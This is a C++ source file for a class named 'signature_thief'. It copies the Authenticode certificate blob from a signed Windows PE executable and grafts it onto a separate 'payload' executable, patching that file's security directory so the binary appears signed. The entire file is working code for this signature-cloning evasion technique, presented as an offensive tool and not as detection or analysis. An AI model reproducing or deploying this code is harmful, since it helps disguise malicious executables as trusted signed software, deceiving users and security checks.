#include "signature_thief.hpp"

#include <fstream>
#include <iostream>
#include <stdexcept>

// Constructor
signature_thief::signature_thief(std::filesystem::path path)
    : m_payload_path(std::move(path)) {
}

// Align to 8 bytes
static void align_to_8(std::vector<uint8_t>& buffer)
{
    size_t aligned = (buffer.size() + 7) & ~size_t(7);
    buffer.resize(aligned);
}

// Load payload (the file to which certificate will be appended)
std::optional<std::string> signature_thief::load_payload() noexcept
{
    std::ifstream in(m_payload_path, std::ios::binary | std::ios::ate);
    if (!in.is_open())
        return "Unable to open payload file: " + m_payload_path.string();

    auto size = in.tellg();
    if (size <= 0)
        return "Invalid payload file size: " + m_payload_path.string();

    m_payload.resize(size);
    in.seekg(0);

    if (!in.read(reinterpret_cast<char*>(m_payload.data()), size))
        return "Failed to read payload file: " + m_payload_path.string();

    return std::nullopt;
}

// Returns pointer to IMAGE_DIRECTORY_ENTRY_SECURITY
IMAGE_DATA_DIRECTORY* signature_thief::security_directory(uint8_t* base)
{
    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);

    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        throw std::runtime_error("Invalid DOS header");

    if (dos->e_lfanew > 0x100000)
        throw std::runtime_error("Invalid PE header offset");

    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);

    if (nt->Signature != IMAGE_NT_SIGNATURE)
        throw std::runtime_error("Invalid NT signature");

    WORD magic = nt->OptionalHeader.Magic;

    if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
        return &reinterpret_cast<PIMAGE_NT_HEADERS32>(nt)
        ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];

    if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
        return &reinterpret_cast<PIMAGE_NT_HEADERS64>(nt)
        ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];

    throw std::runtime_error("Unknown PE optional header format");
}

// Extract certificate from signed PE
void signature_thief::extract_certificate(const std::filesystem::path& signed_pe_path)
{
    std::ifstream in(signed_pe_path, std::ios::binary | std::ios::ate);
    if (!in.is_open())
        throw std::runtime_error("Unable to open signed file: " + signed_pe_path.string());

    auto size = in.tellg();
    if (size <= 0)
        throw std::runtime_error("Invalid signed file size: " + signed_pe_path.string());

    std::vector<uint8_t> buffer(size);
    in.seekg(0);

    if (!in.read(reinterpret_cast<char*>(buffer.data()), size))
        throw std::runtime_error("Failed to read signed file: " + signed_pe_path.string());

    auto* sec_dir = security_directory(buffer.data());

    DWORD va = sec_dir->VirtualAddress;
    DWORD sz = sec_dir->Size;

    if (va == 0 || sz == 0 || va + sz > buffer.size())
        throw std::runtime_error("No valid certificate found in signed PE");

    m_cert.assign(buffer.begin() + va, buffer.begin() + va + sz);
}

// Append certificate to payload
void signature_thief::append_certificate(std::span<const uint8_t> signature)
{
    if (signature.empty())
        throw std::runtime_error("Certificate is empty");

    align_to_8(m_payload);

    DWORD cert_offset = static_cast<DWORD>(m_payload.size());

    m_payload.insert(m_payload.end(), signature.begin(), signature.end());

    auto* sec_dir = security_directory(m_payload.data());
    sec_dir->VirtualAddress = cert_offset;
    sec_dir->Size = static_cast<DWORD>(signature.size());
}